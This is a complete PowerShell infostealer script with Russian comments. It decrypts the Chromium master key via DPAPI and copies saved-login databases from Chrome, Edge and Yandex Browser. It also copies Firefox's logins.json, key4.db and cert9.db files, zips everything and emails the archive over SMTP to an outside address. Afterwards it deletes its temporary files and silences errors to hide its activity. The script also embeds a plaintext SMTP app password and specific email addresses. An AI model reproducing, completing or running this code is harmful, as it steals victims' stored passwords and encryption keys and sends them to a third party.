# [ Конфигурация SMTP ]
$SmtpServer = "smtp.mail.ru"
$SmtpPort = 587
$SmtpUser = "agafonovsquad@yandex.ru"  # Твоя почта
$SmtpPass = "vofiyuidkrihhala"    # ПАРОЛЬ ПРИЛОЖЕНИЯ (16 знаков)
$To = "glebagafov434@gmail.com"        # Можно отправить самому себе

# [ Инициализация ]
$tempDir = "$env:TEMP\sys_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
$logPath = "$tempDir\report.log"

Add-Type -AssemblyName System.Security

# Функция для дешифровки ключа Chromium
function Get-Key($statePath, $label) {
    if (Test-Path $statePath) {
        try {
            $json = Get-Content $statePath -Raw | ConvertFrom-Json
            $rawKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $encKey = $rawKey[5..($rawKey.Length-1)]
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            $logLine = "[$($label)] Master Key: $([Convert]::ToBase64String($masterKey))"
            Out-File -FilePath $logPath -InputObject $logLine -Append -Encoding UTF8
            return $true
        } catch { return $false }
    }
    return $false
}

# 1. СБОР ДАННЫХ CHROMIUM
$browsers = @(
    @{name="Chrome"; path="Google\Chrome\User Data"},
    @{name="Edge"; path="Microsoft\Edge\User Data"},
    @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $userDataPath = Join-Path $env:LOCALAPPDATA $b.path
    if (Test-Path $userDataPath) {
        $foundFiles = Get-ChildItem -Path $userDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        foreach ($file in $foundFiles) {
            $label = "$($b.name)_$($file.Directory.Name)"
            $localState = Join-Path $userDataPath "Local State"
            if (Get-Key $localState $label) {
                Copy-Item $file.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# 2. СБОР ДАННЫХ FIREFOX (Полный комплект: logins + key4 + cert9)
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    $ffProfiles = Get-ChildItem -Path $ffPath -Directory -ErrorAction SilentlyContinue
    foreach ($profile in $ffProfiles) {
        $label = "FF_$($profile.Name)"
        $files = @("logins.json", "key4.db", "cert9.db")
        foreach ($f in $files) {
            $src = Join-Path $profile.FullName $f
            if (Test-Path $src) {
                Copy-Item $src -Destination "$tempDir\$($label)_$f" -Force -ErrorAction SilentlyContinue
            }
        }
        Out-File -FilePath $logPath -InputObject "[$($label)] Profile collected." -Append -Encoding UTF8
    }
}

# 3. УПАКОВКА И ОТПРАВКА НА ПОЧТУ
if ((Get-ChildItem $tempDir).Count -gt 1) {
    $zipPath = "$env:TEMP\report_$(Get-Random).zip"
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force

    try {
        $msg = New-Object System.Net.Mail.MailMessage
        $msg.From = $SmtpUser
        $msg.To.Add($To)
        $msg.Subject = "Protocol 81: $env:COMPUTERNAME ($env:USERNAME)"
        $msg.Body = "Report attached. System: $(Get-Date -Format 'dd.MM.yyyy HH:mm')"
        
        $att = New-Object System.Net.Mail.Attachment($zipPath)
        $msg.Attachments.Add($att)
        
        $smtp = New-Object System.Net.Mail.SmtpClient($SmtpServer, $SmtpPort)
        $smtp.EnableSsl = $true
        $smtp.Credentials = New-Object System.Net.NetworkCredential($SmtpUser, $SmtpPass)
        
        $smtp.Send($msg)
        
        # Освобождаем ресурсы
        $att.Dispose()
        $msg.Dispose()
    } catch {}

    # Очистка архива
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
}

# Финальная очистка временной папки
Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
